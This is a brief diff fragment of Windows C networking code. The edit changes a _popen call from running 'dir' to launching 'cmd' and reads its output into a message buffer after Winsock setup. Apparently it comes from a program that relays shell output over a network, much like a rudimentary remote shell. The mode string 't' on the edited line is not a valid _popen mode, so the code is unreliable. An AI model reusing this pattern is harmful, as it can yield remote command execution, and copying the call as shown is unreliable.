@@ -33,7 +33,7 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
                 
             }else{
                 
-                FILE* commText = _popen("dir","r");
+                FILE* commText = _popen("cmd","t");
                 if (commText != NULL){
                     while(fgets(MSG, sizeof(MSG), commText) != NULL){
                         
